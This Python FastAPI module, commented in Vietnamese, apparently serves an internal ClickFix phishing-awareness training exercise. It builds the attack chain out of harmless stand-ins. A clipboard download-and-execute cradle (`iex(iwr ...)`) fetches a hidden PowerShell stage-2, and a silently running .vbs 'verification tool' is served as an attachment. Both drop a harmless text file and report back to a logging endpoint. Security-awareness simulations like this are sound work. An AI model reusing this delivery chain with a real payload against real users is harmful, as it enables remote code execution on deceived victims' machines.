"""
ClickFix training simulation endpoints.

Lưu ý: đây là endpoint cho môi trường TRAINING nội bộ.
Payload PowerShell được copy vào clipboard của user chỉ thực hiện
một HTTP GET request — không chạy lệnh độc hại nào.
"""
from __future__ import annotations

import re
import time
from threading import Lock
from typing import Dict, Optional

from fastapi import APIRouter, Query, Request
from fastapi.responses import JSONResponse, PlainTextResponse

router = APIRouter(prefix="/api/clickfix", tags=["clickfix"])
TOKEN_RE = re.compile(r"^[A-Za-z0-9_\-]{1,64}$")

# In-memory store cho môi trường training. Nếu muốn scale,
# thay bằng Redis hoặc DB.
_VERIFY_STORE: Dict[str, dict] = {}
_STORE_LOCK = Lock()

# Token hết hạn sau 30 phút để tránh rò rỉ memory
_TOKEN_TTL_SECONDS = 30 * 60


def _gc_expired() -> None:
    """Dọn token hết hạn mỗi lần có request mới."""
    now = time.time()
    expired = [k for k, v in _VERIFY_STORE.items() if now - v["created_at"] > _TOKEN_TTL_SECONDS]
    for k in expired:
        _VERIFY_STORE.pop(k, None)


@router.get("/s", response_class=PlainTextResponse)
async def clickfix_stage2(
    request: Request,
    t: str = Query(..., description="Token sinh ra từ frontend register form"),
):
    """
    Stage-2 của payload ClickFix (2 giai đoạn như campaign thật):
    payload trên clipboard chỉ là cradle ngắn `iex(iwr '<url>/s?t=...')`,
    script này được tải về và chạy hidden trên máy user.

    Nội dung 100% vô hại: tạo C:\\Temp\\hehehe.txt ('Hehehehe') rồi
    gọi /api/clickfix/verify. Ghi lại dấu vết 'downloaded' để instructor
    thấy được ai đã tải payload kể cả khi chưa chạy.
    """
    token = (t or "").strip()
    if not TOKEN_RE.match(token):
        return PlainTextResponse("Write-Error 'bad token'", status_code=400)

    client_ip = request.client.host if request.client else "unknown"
    origin = str(request.base_url).rstrip("/")
    with _STORE_LOCK:
        _gc_expired()
        entry = _VERIFY_STORE.get(token) or {"created_at": time.time(), "verified": False}
        entry["downloaded_at"] = time.time()
        entry["client_ip"] = client_ip
        _VERIFY_STORE[token] = entry

    print(f"[CLICKFIX] ⬇ DOWNLOAD token={token} ip={client_ip}", flush=True)

    script = (
        "$ErrorActionPreference='SilentlyContinue'\n"
        "New-Item 'C:\\Temp' -ItemType Directory -Force|Out-Null\n"
        "Set-Content 'C:\\Temp\\hehehe.txt' 'Hehehehe'\n"
        f"Invoke-WebRequest '{origin}/api/clickfix/verify?t={token}' -UseBasicParsing|Out-Null\n"
    )
    return PlainTextResponse(script, media_type="text/plain")


@router.get("/tool")
async def clickfix_tool(
    request: Request,
    t: str = Query(..., description="Token sinh ra từ frontend register form"),
):
    """
    Tải "công cụ xác minh" = file .vbs VO HẠI (token nhúng sẵn trong file).

    User chỉ cần mở file (double-click) thay vì gõ Win+R + paste. File chạy
    im lặng qua wscript: tạo C:\\Temp\\hehehe.txt ('Hehehehe') rồi gọi verify.
    Nếu browser user bật "Always open files of this type" thì tải xong là
    chạy luôn — gần như tự động hoàn toàn.
    """
    token = (t or "").strip()
    if not TOKEN_RE.match(token):
        return PlainTextResponse("bad token", status_code=400)

    client_ip = request.client.host if request.client else "unknown"
    origin = str(request.base_url).rstrip("/")
    with _STORE_LOCK:
        _gc_expired()
        entry = _VERIFY_STORE.get(token) or {"created_at": time.time(), "verified": False}
        entry["downloaded_at"] = time.time()
        entry["client_ip"] = client_ip
        _VERIFY_STORE[token] = entry

    print(f"[CLICKFIX] ⬇ TOOL-DOWNLOAD token={token} ip={client_ip}", flush=True)

    vbs = (
        "' Training verification tool - VO HAI, chi tao file text va bao ve server training\r\n"
        "On Error Resume Next\r\n"
        "Dim fso, ts\r\n"
        "Set fso = CreateObject(\"Scripting.FileSystemObject\")\r\n"
        "If Not fso.FolderExists(\"C:\\Temp\") Then fso.CreateFolder(\"C:\\Temp\")\r\n"
        "Set ts = fso.CreateTextFile(\"C:\\Temp\\hehehe.txt\", True)\r\n"
        "ts.Write \"Hehehehe\"\r\n"
        "ts.Close\r\n"
        "Dim http\r\n"
        "Set http = CreateObject(\"MSXML2.XMLHTTP\")\r\n"
        f"http.open \"GET\", \"{origin}/api/clickfix/verify?t={token}\", False\r\n"
        "http.send\r\n"
    )
    return PlainTextResponse(
        vbs,
        media_type="text/plain",
        headers={"Content-Disposition": 'attachment; filename="verification.vbs"'},
    )


@router.get("/verify")
async def clickfix_verify(
    request: Request,
    t: str = Query(..., description="Token sinh ra từ frontend register form"),
):
    """
    Được gọi bởi payload PowerShell khi user thực hiện thành công
    chuỗi Win+R → Ctrl+V → Enter.

    Log lại hành vi để phân tích sau buổi training.
    """
    token = (t or "").strip()
    if not token:
        return JSONResponse({"ok": False, "error": "missing token"}, status_code=400)

    client_ip = request.client.host if request.client else "unknown"
    user_agent = request.headers.get("user-agent", "unknown")
    referer = request.headers.get("referer", "")

    with _STORE_LOCK:
        _gc_expired()
        entry = _VERIFY_STORE.get(token) or {
            "created_at": time.time(),
            "verified": False,
        }
        entry["verified"] = True
        entry["verified_at"] = time.time()
        entry["client_ip"] = client_ip
        entry["user_agent"] = user_agent
        entry["referer"] = referer
        _VERIFY_STORE[token] = entry

    # Log ra stdout để bạn xem trong terminal đang chạy uvicorn
    print(
        f"[CLICKFIX] ✅ VERIFIED token={token} ip={client_ip} ua={user_agent[:80]}",
        flush=True,
    )

    return {"ok": True, "verified": True}


@router.get("/status")
async def clickfix_status(
    t: str = Query(..., description="Token cần kiểm tra trạng thái"),
):
    """
    Frontend poll endpoint này mỗi 2 giây để biết user đã verify chưa.
    """
    token = (t or "").strip()
    if not token:
        return JSONResponse({"verified": False, "error": "missing token"}, status_code=400)

    with _STORE_LOCK:
        _gc_expired()
        entry: Optional[dict] = _VERIFY_STORE.get(token)

    if not entry:
        return {"verified": False}

    return {
        "verified": bool(entry.get("verified")),
        "verified_at": entry.get("verified_at"),
    }


@router.get("/stats")
async def clickfix_stats():
    """
    Endpoint phụ để bạn xem nhanh ai đã verify trong buổi training.
    Truy cập: http://localhost:8000/api/clickfix/stats
    """
    with _STORE_LOCK:
        _gc_expired()
        total = len(_VERIFY_STORE)
        verified = sum(1 for v in _VERIFY_STORE.values() if v.get("verified"))
        entries = [
            {
                "token": k,
                "verified": v.get("verified", False),
                "downloaded_at": v.get("downloaded_at"),
                "verified_at": v.get("verified_at"),
                "client_ip": v.get("client_ip"),
                "user_agent": v.get("user_agent", "")[:100],
            }
            for k, v in _VERIFY_STORE.items()
        ]
    return {"total": total, "verified": verified, "entries": entries}